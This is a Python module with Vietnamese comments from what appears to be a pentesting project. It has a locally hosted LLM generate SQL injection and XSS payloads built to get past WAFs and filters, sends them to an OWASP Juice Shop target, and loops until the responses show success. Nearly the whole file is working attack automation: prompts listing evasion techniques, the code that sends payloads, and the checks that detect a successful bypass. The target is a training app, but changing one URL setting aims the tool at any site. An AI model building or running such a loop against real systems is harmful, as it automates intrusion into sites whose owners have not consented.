# ═══════════════════════════════════════════════════════════════
# bypass_loop.py — AI sinh payload bypass WAF theo vòng lặp
#
# Đã cập nhật: SSTI → XSS
# - Marker: SSTI dùng 60481729, XSS dùng XSS_MARKER reflection
# ═══════════════════════════════════════════════════════════════

import json
import re
import logging
import httpx
import ollama

from config import (
    AI_SERVER, LLM_MODEL,
    TEMP_BYPASS, BYPASS_MAX_ROUNDS,
    JUICE_SHOP_URL, LOG_FILE
)
from ai_analyzer import _get_vs
from fuzzer import XSS_MARKER

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s %(levelname)s [bypass] %(message)s"
)

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/120.0.0.0 Safari/537.36"
}

SQLI_SUCCESS_MARKERS = [
    "syntax error", "sqlite", "sql", "ora-",
    "mysql", "odbc", "unclosed quotation",
    "near \"", "unrecognized token"
]

# Dạng encode — nếu xuất hiện thì XSS bị filter
XSS_ENCODED_FORMS = ["&lt;", "&#60;", "\\u003c", "%3C", "%3c"]


def _evaluate_success(body: str, vuln_type: str) -> bool:
    """
    Rule-based evaluate — không dùng AI.

    SQLi: check error string markers
    XSS : check XSS_MARKER có trong body VÀ không bị encode
    """
    if vuln_type == "sqli":
        return any(m in body.lower() for m in SQLI_SUCCESS_MARKERS)

    elif vuln_type == "xss":
        if XSS_MARKER not in body:
            return False
        # Tìm context xung quanh marker
        idx     = body.find(XSS_MARKER)
        snippet = body[max(0, idx - 50): idx + len(XSS_MARKER) + 50]
        # Nếu < bị encode → server đã escape → không thành công
        if any(enc in snippet for enc in XSS_ENCODED_FORMS):
            return False
        return True

    return False


def _send_payload(finding: dict, payload: str) -> tuple[str, int]:
    """Gửi payload đến target — không cần auth."""
    url    = f"{JUICE_SHOP_URL}{finding['url']}"
    method = finding.get("method", "GET")
    param  = finding["param"]

    try:
        if method == "GET":
            r = httpx.get(
                url,
                params={param: payload},
                headers=DEFAULT_HEADERS,
                timeout=10,
                follow_redirects=True
            )
        else:
            r = httpx.post(
                url,
                data={param: payload},
                headers=DEFAULT_HEADERS,
                timeout=10,
                follow_redirects=True
            )
        return r.text[:500], r.status_code
    except httpx.TimeoutException:
        logging.warning(f"[bypass] Timeout: {url}")
        return "", 0
    except Exception as e:
        logging.warning(f"[bypass] HTTP lỗi: {e}")
        return "", 0


def _build_bypass_prompt(finding: dict, context: str, history: list) -> str:
    vuln_type   = finding.get("type", "sqli")
    history_str = json.dumps(history, ensure_ascii=False, indent=2) \
        if history else "[]  (chưa thử vòng nào)"

    # Hướng dẫn bypass khác nhau tùy loại
    if vuln_type == "xss":
        techniques = ("HTML entity encode, Unicode escape, "
                      "case variation (ScRiPt), event handler thay thế "
                      "(onfocus, onmouseover, oncut), "
                      "tag thay thế (svg, details, math), "
                      "javascript: URI, template literal")
        # Đảm bảo LLM sinh payload có XSS_MARKER
        extra = (f"\nQUAN TRỌNG: Payload phải chứa chuỗi '{XSS_MARKER}' "
                 f"để có thể detect reflection.")
    else:
        techniques = ("URL encoding, double encoding, comment injection /**/,"
                      "case variation, null byte, hex encoding")
        extra = ""

    return f"""Loại lỗ hổng : {vuln_type}
URL          : {finding.get('url', '?')}
Param        : {finding.get('param', '?')}
Method       : {finding.get('method', 'GET')}

OWASP Bypass Techniques (từ knowledge base):
{context}

Lịch sử payload đã thử — KHÔNG được lặp lại:
{history_str}

Yêu cầu: Sinh MỘT payload bypass WAF/filter mới.
Ưu tiên techniques: {techniques}{extra}

Trả về JSON THUẦN (không markdown, không text thừa):
{{
  "payload": "payload bypass cụ thể ở đây",
  "technique": "tên technique đang dùng",
  "reasoning": "tại sao technique này có thể bypass được filter"
}}"""


def bypass_one(finding: dict) -> dict:
    """Chạy bypass loop cho một finding."""
    vuln_type = finding.get("type", "sqli")
    url       = finding.get("url", "?")
    history   = []
    client    = ollama.Client(host=AI_SERVER)

    print(f"\n[Bypass] {vuln_type.upper()} @ {url}")
    print(f"         Tối đa {BYPASS_MAX_ROUNDS} vòng...")

    for rnd in range(1, BYPASS_MAX_ROUNDS + 1):

        # RAG context
        try:
            vs   = _get_vs()
            docs = vs.similarity_search(
                f"{vuln_type} WAF bypass filter evasion technique", k=2)
            ctx  = "\n\n".join(doc.page_content for doc in docs)
        except Exception as e:
            logging.warning(f"RAG bypass lỗi: {e}")
            ctx = "Không có context."

        prompt = _build_bypass_prompt(finding, ctx, history)

        # Gọi LLM
        try:
            response = client.chat(
                model=LLM_MODEL,
                messages=[{"role": "user", "content": prompt}],
                options={"temperature": TEMP_BYPASS}
            )
            raw = response["message"]["content"]
        except Exception as e:
            logging.warning(f"LLM bypass lỗi vòng {rnd}: {e}")
            print(f"         Vòng {rnd}: LLM lỗi — skip")
            continue

        # Parse payload
        match = re.search(r'(\{.*\})', raw, re.DOTALL)
        if not match:
            print(f"         Vòng {rnd}: parse lỗi — skip")
            continue
        try:
            obj = json.loads(match.group(1))
        except json.JSONDecodeError:
            print(f"         Vòng {rnd}: JSON malformed — skip")
            continue

        payload   = obj.get("payload", "")
        technique = obj.get("technique", "unknown")

        if not payload:
            print(f"         Vòng {rnd}: payload rỗng — skip")
            continue

        # Với XSS — đảm bảo payload có marker
        if vuln_type == "xss" and XSS_MARKER not in payload:
            print(f"         Vòng {rnd}: XSS payload thiếu marker — skip")
            continue

        # Thực thi
        body, status = _send_payload(finding, payload)
        success = _evaluate_success(body, vuln_type)

        history.append({
            "round":     rnd,
            "payload":   payload,
            "technique": technique,
            "success":   success,
            "status":    status,
            "snippet":   body[:120]
        })

        if success:
            print(f"         Vòng {rnd}: ✅ SUCCESS [{technique}] {payload[:60]}")
            logging.info(f"Bypass success [{vuln_type}] {url} vòng {rnd}")
            break
        else:
            print(f"         Vòng {rnd}: ✗ fail    [{technique}] {payload[:50]}")

    bypass_success = any(r["success"] for r in history)
    finding["bypass_history"] = history
    finding["bypass_success"] = bypass_success

    if bypass_success:
        winning = next(r for r in history if r["success"])
        print(f"[Bypass] ✅ Thành công (vòng {winning['round']}, "
              f"technique: {winning['technique']})")
    else:
        print(f"[Bypass] ✗  Không bypass được sau {BYPASS_MAX_ROUNDS} vòng")

    return finding


def bypass_all(findings: list) -> list:
    """Chạy bypass loop cho tất cả findings có confidence >= 0.5."""
    if not findings:
        print("[Bypass] ⚠️  Không có finding nào")
        return []

    eligible = [f for f in findings if f.get("confidence", 0) >= 0.5]
    skipped  = len(findings) - len(eligible)

    print(f"\n[Bypass] {len(eligible)} eligible "
          f"({skipped} skipped vì confidence < 0.5)")
    print(f"         Model: {LLM_MODEL} @ {AI_SERVER}")

    results = []
    for i, finding in enumerate(findings, 1):
        if finding.get("confidence", 0) < 0.5:
            finding["bypass_history"] = []
            finding["bypass_success"] = False
            results.append(finding)
            continue
        print(f"\n[Bypass] [{i}/{len(findings)}]")
        results.append(bypass_one(finding))

    success_count = sum(1 for f in results if f.get("bypass_success"))
    print(f"\n[Bypass] ✅ {success_count}/{len(eligible)} bypass thành công")
    logging.info(f"bypass_all: {success_count}/{len(eligible)} success")
    return results
